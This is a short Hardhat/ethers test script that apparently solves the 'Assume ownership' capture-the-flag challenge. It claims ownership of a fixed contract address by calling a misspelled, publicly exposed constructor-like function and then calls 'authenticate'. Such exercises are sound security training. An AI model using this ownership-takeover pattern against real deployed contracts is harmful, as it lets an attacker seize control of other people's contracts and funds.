import { ethers } from "hardhat";
import { expect } from "chai";

describe("assumeovernship", function() {
    it("should solve assume ownership challenge", async function() {
        this.timeout(0);

        const targetABI = [
            "function AssumeOwmershipChallenge() public",
            "function authenticate() public",
        ];
        const targetAddr = "0xa4937e1dF27983a7CE9214654DA706386e786B06";

        const signers = await ethers.getSigners();
        const eoa = signers[0];
        let balance = await eoa.getBalance();
        console.log(ethers.utils.formatEther(balance));

        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let target = contract.connect(eoa);
        
        let tx = await target.AssumeOwmershipChallenge();
        tx.wait();

        expect(tx).to.not.be.undefined;
        console.log(tx);

        tx = await target.authenticate();
        tx.wait();

        expect(tx).to.not.be.undefined;
        console.log(tx);

    });
});